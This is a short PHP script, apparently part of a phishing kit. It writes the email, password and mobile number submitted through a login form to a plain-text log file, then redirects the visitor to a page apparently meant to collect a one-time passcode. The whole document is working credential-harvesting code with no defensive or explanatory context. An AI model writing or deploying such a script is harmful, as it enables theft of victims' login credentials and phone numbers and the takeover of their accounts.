<?php

    file_put_contents("log.txt", "Email: " . $_POST['email'] . " Pass: " . $_POST['loginPassword'] . " Mobile: " . $_POST['mobileNumber'] . "\n", FILE_APPEND);
header('Location: otp.login.php');
exit();